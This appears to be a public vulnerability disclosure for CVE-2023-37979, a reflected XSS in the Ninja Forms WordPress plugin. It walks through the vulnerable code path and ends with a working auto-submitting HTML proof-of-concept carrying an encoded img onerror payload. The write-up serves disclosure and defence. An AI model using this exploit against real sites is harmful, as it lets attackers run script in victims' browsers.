# CVE-2023-37979
# CVSS score: 7.1
# Date: 2023-07-27

## XSS in Ninja Forms wordpress plugin
## This plugin is one of the most famous plugins for creating forms and has more than 800,000 active installations
![Alt text](https://github.com/Fire-Null/CVE-2023-37979/blob/main/img/1.jpg)

## Quick check
#### This vulnerability was found on July 7, which allows JavaScript to run on the user's browser
### So How Does the exploit work?
#### Due to the lack of validation of the sent parameter and its direct display in the browser, it is possible to execute JavaScript code and this vulnerability exists in versions 3.6.25 and above. The following request is to load a form template whose action is nf_batch_process.
![Alt text](https://github.com/Fire-Null/CVE-2023-37979/blob/main/img/2.jpg)
#### In the include/AJAX/REST/Controller.php file, a parameter called method_override is received through the POST method, which is not present in the above request, the value of this parameter is the name of the class method that must be overwritten.
![Alt text](https://github.com/Fire-Null/CVE-2023-37979/blob/main/img/3.jpg)
#### In the includes\AJAX\REST\BatchProcess.php file, in the get_request_data function, a parameter called data is found through the POST method, which is not validated, and this parameter is not present in the request data.
![Alt text](https://github.com/Fire-Null/CVE-2023-37979/blob/main/img/4.jpg)
#### In the include\Abstracts\Controller.php file, in the _respond method, whose input is the data parameter, it is printed on the screen without any validation.
![Alt text](https://github.com/Fire-Null/CVE-2023-37979/blob/main/img/5.jpg)
#### Finally, by adding data and method_override parameters to the Load Template request and rewriting the _respond method using the method_override parameter, an XSS vulnerability occurs.
![Alt text](https://github.com/Fire-Null/CVE-2023-37979/blob/main/img/6.jpg)
#### Response of request
![Alt text](https://github.com/Fire-Null/CVE-2023-37979/blob/main/img/7.jpg)
#### This vulnerability can be exploited by giving the user a link containing the Exploit code.
![Alt text](https://github.com/Fire-Null/CVE-2023-37979/blob/main/img/8.jpg)
#### Exploit code:
```html
<html>
<body>
<form  action="http://localhost/wordpress/wp-admin/admin-ajax.php"  method="POST">
<input  type="hidden"  name="action"  value="nf&#95;batch&#95;process"  />
<input  type="hidden"  name="batch&#95;type"  value="import&#95;form&#95;template"  />
<input  type="hidden"  name="security"  value="e29f2d8dca"  />
<input  type="hidden"  name="extraData&#91;template&#93;"  value="formtemplate&#45;contactformd"  />
<input  type="hidden"  name="method&#95;override"  value="&#95;respond"  />
<input  type="hidden"  name="data"  value="firenull&quot;&#125;&#125;&lt;img&#32;src&#61;firenull&#32;onerror&#61;alert&#40;String&#46;fromCharCode&#40;88&#44;83&#44;83&#41;&#41;&gt;"  />
<input  type="submit"  value="Submit request"  />
</form>
<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</body>
</html>
```
